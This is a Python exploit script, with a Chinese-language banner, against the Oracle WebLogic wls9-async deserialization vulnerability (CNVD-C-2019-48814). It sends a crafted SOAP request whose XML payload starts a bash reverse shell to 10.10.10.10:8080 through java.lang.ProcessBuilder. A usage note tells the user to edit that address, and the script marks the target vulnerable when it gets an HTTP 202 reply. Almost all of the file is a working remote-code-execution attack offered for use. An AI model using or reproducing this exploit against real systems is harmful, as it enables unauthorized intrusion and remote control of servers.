#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @Time    : 2019-04-25 10:51
# @Author  : Stardustsky
# @File    : CNVD-C-2019-48814.py
# @Software: PyCharm

import requests
import optparse


path = '/_async/AsyncResponseService'

payload = '''
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:wsa="http://www.w3.org/2005/08/addressing" xmlns:asy="http://www.bea.com/async/AsyncResponseService">   
<soapenv:Header> 
<wsa:Action>xx</wsa:Action>
<wsa:RelatesTo>xx</wsa:RelatesTo>
<work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
<void class="java.lang.ProcessBuilder">
<array class="java.lang.String" length="3">
<void index="0">
<string>/bin/bash</string>
</void>
<void index="1">
<string>-c</string>
</void>
<void index="2">
<string>bash -i &gt;&amp; /dev/tcp/10.10.10.10/8080 0&gt;&amp;1</string>
</void>
</array>
<void method="start"/></void>
</work:WorkContext>
</soapenv:Header>
<soapenv:Body>
<asy:onAsyncDelivery/>
</soapenv:Body></soapenv:Envelope>
'''

if __name__ == '__main__':
    print '''
    =============================================
            Weblogic wls9-async 反序列化漏洞
                Author：Stardustsky
    =============================================
        EG:该exp为反弹shell的EXP，请修改payload中地址
    Python CNVD-C-2019-48814.py -u 10.10.10.10:7001 
    '''
    parser = optparse.OptionParser()
    parser.add_option("-u", "--url", dest="url", help="Target URL (e.g. -u 10.10.10.1:7001)")
    # parser.add_option("-e", dest="command", help="Execute command (e.g -e whoami)")
    options, _ = parser.parse_args()
    f = options.url
    try:
        header = {'content-type': 'text/xml'}
        r=requests.post('http://'+f+path,headers=header,data=payload,timeout=3)#默认全部为http请求
        if(r.status_code == 202):
            print('[+]'+f.strip()+'存在wls9-async组件反序列化漏洞')
        else:
            print('[-]不存在漏洞')
    except requests.exceptions.RequestException as e:
        print('[-]'+f.strip()+'连接超时')

